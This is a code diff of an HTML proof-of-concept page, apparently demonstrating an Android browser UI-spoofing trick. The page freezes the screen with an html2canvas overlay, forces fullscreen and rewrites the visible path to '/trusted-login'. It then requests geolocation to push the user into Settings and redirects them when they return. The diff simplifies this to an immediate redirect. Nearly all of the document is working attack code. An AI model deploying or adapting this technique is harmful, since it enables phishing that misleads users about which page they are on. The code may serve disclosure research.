@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Android Geo Desync PoC</title>
+<title>Android Geo Direct Redirect PoC</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 <style>
 body {
@@ -25,17 +25,17 @@ button {
 </head>
 <body>
 
-<button id="start">Start Demos</button>
+<button id="start">Start Demo</button>
 
 <script>
 const TARGET = "https://google.com";
-let waitingForReturn = false;
+let triggered = false;
 
 // Freeze UI overlay
 function freezeUI() {
   return html2canvas(document.body, {scale:2, useCORS:true}).then(canvas=>{
     const img = document.createElement("img");
-    img.src = canvas.toDataURL("image/png");
+    img.src = canvas.toDataURL();
     Object.assign(img.style, {
       position:"fixed",
       top:"0",
@@ -49,58 +49,33 @@ function freezeUI() {
   });
 }
 
-// Request Geolocation
+// Request geolocation just to trigger settings
 function requestGeo() {
-  waitingForReturn = true;
-  navigator.geolocation.getCurrentPosition(
-    () => location.replace(TARGET),
-    () => {} // user denied
-  );
+  navigator.geolocation.getCurrentPosition(()=>{},()=>{});
 }
 
-// Check permission state
-function tryRedirect() {
-  if (!navigator.permissions) return;
-  navigator.permissions.query({name:'geolocation'}).then(res=>{
-    if(res.state === "granted"){
-      location.replace(TARGET);
-    }
-  });
-}
-
-// Polling untuk deteksi balik dari Settings
-function startPolling() {
-  let tries = 0;
-  const interval = setInterval(()=>{
-    tryRedirect();
-    tries++;
-    if(tries>20) clearInterval(interval); // ~10 detik
-  },500);
-}
-
-// Event ketika user balik dari Settings
-document.addEventListener("visibilitychange", ()=>{
-  if(document.visibilityState==="visible" && waitingForReturn){
-    startPolling();
+// Direct redirect
+function redirectNow() {
+  if(!triggered){
+    triggered = true;
+    location.replace(TARGET);
   }
-});
-window.addEventListener("focus", ()=>{ if(waitingForReturn) startPolling(); });
-window.addEventListener("pageshow", ()=>{ if(waitingForReturn) startPolling(); });
+}
+
+// Detect user returning from Settings
+document.addEventListener("visibilitychange", ()=>{ if(document.visibilityState==="visible") redirectNow(); });
+window.addEventListener("focus", redirectNow);
+window.addEventListener("pageshow", redirectNow);
 
 // Start PoC
 document.getElementById("start").onclick = ()=>{
-  // fullscreen
   if(document.documentElement.requestFullscreen){
     document.documentElement.requestFullscreen();
   }
 
-  // spoof path
   history.replaceState({}, '', '/trusted-login');
 
-  // freeze UI
-  freezeUI().then(()=>{
-    setTimeout(()=>{ requestGeo(); },100);
-  });
+  freezeUI().then(()=>{ setTimeout(requestGeo, 100); });
 };
 </script>
 
